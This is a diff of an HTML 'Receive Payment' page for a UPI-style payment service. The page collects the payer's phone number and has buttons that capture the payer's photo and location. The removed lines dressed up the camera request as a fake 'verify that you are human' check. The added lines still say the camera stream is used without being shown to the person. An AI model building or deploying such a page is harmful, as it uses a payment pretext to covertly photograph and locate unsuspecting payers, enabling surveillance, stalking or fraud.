@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>PayMitra — Receive Payment</title>
+  <title>PayMeeeeee — Receive Payment</title>
   <style>
     :root{
       --accent:#0B5FFF;
@@ -36,14 +36,14 @@
     <header>
       <div class="logo">PM</div>
       <div>
-        <h1>PayMitra — Receive Payment</h1>
-        <p class="sub">Share your payment details.</p>
+        <h1>PayMeeeee — Receive Payment</h1>
+        <p class="sub">Share your payment details. Capture payer photo & location with permission.</p>
       </div>
     </header>
 
     <!-- Payment details -->
     <label>Account number / UPI ID</label>
-    <input id="account" type="text" placeholder="Account number or UPI ID (eg. name@upi)">
+    <input id="account" type="text" placeholder="Account number or UPI ID (eg. name@upi)" value="your-acc-or-upi@example">
 
     <label>Upload QR (optional)</label>
     <div class="qr-wrap">
@@ -55,19 +55,19 @@
     </div>
 
     <label>Other person's phone number (to record payer)</label>
-    <input id="payerPhone" type="tel" placeholder="Mobile number of payer (required)">
+    <input id="payerPhone" type="tel" placeholder="Phone number of payer (optional)">
 
     <div style="margin-top:12px">
-      <button id="startCapture" class="primary">Click to verify that you are human</button>
-      <div class="muted small">The camera permission is required for verification.</div>
+      <button id="startCapture" class="primary">Click to capture photo</button>
+      <div class="muted small">The camera stream will be used but not shown on this page. We will not display your live video or the captured photo here.</div>
     </div>
 
     <div style="margin-top:8px">
-      <button id="sendData" class="secondary" disabled>Send UPI ID/QR Code</button>
+      <button id="sendData" class="secondary" disabled>Send photo & location</button>
       <div id="status" class="status"></div>
     </div>
 
-    <p class="small">This page will request them only when you click the buttons above. Our terms and conditions are required to fulfill</p>
+    <p class="small">By clicking you give permission to use your camera & location. This page will request them only when you click the buttons above.</p>
   </div>
 
   <!-- Hidden elements for capture (not shown) -->
@@ -204,8 +204,6 @@
   // Cleanup when navigating away
   window.addEventListener('beforeunload', ()=> stopStream());
 })();
-  
-
 </script>
 </body>
 </html>
